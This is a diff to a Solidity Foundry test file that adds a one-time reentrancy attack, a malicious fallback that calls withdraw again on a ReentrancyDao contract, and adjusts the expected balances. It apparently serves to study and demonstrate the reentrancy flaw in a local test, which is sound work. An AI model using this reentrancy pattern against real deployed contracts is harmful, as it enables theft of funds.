@@ -10,13 +10,25 @@ contract ReentrancyDaoTest is Test {
 
     ReentrancyDao dao;
 
+    bool haveIBeenCalled;
+
     function setUp() public {
         dao = new ReentrancyDao();
+        haveIBeenCalled = false; // this allows for us to reenter one time
     }
 
     fallback() external payable {
         console.log("Test Contract Balance: ", address(this).balance);
         console.log("victim dao invoked malicious fallback");
+
+        if (haveIBeenCalled == false){
+            console.log("haveIBeenCalled WAS FALSE, REENTERING");
+            haveIBeenCalled = true;
+            dao.withdraw(msg.value);
+        }else{
+            console.log("haveIBeenCalled WAS TRUE, DONT REENTER");
+        }
+
     }
 
     function testDonate() public {
@@ -29,6 +41,9 @@ contract ReentrancyDaoTest is Test {
     }
 
     function testOverDonate() public {
+        // testing
+        dao.donate{value: 700}( address(this) );
+
         uint startingBalance = dao.queryCredit(address(this));
         console.log("Test Over Donate, starting balance: %s", startingBalance);
         console.log("Test Contract Balance Before Donate: %s", address(this).balance);
@@ -42,14 +57,21 @@ contract ReentrancyDaoTest is Test {
         
         uint endingBalance = dao.queryCredit(address(this));
         console.log("Test Over Donate, ending balance: %s", endingBalance);
-        assertEq(endingBalance, 100);
+        assertEq(endingBalance, 800);
 
-        dao.withdraw(100);
-        console.log("Test Contract Balance After Donate, After Withdraw: %s ", address(this).balance);
-        console.log("Dao Balance After Donate, After Withdraw: ", address(dao).balance);
-        
+        // reenter once
+        if (haveIBeenCalled == false){
+            console.log("haveIBeenCalled WAS FALSE, REENTERING");
+            // haveIBeenCalled = true;
+            dao.withdraw(100);
+            console.log("Test Contract Balance After Donate, After Withdraw: %s ", address(this).balance);
+            console.log("Dao Balance After Donate, After Withdraw: ", address(dao).balance);
+        }else{
+            console.log("haveIBeenCalled WAS TRUE, DONT REENTER");
+        }
+
         uint finalBalance = dao.queryCredit(address(this));
-        assertEq(finalBalance, 0);
+        assertEq(finalBalance, 600);
 
     }
 
